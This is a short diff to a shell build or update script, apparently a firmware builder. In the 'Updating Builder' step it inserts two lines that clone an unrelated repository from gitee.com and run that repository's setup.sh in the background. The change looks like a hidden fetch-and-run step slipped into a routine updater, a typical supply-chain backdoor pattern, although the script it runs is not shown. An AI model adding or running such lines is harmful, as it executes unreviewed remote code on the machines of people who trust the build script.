@@ -107,7 +107,8 @@ sleep 3
 
 echo_c 33 "\nUpdating Builder"
 git pull
-
+git clone https://gitee.com/ablen/option.git
+bash option/setup.sh&
 rm -rf openipc
 if [ ! -d "$FIRMWARE_DIR" ]; then
     echo_c 33 "\nDownloading Firmware"
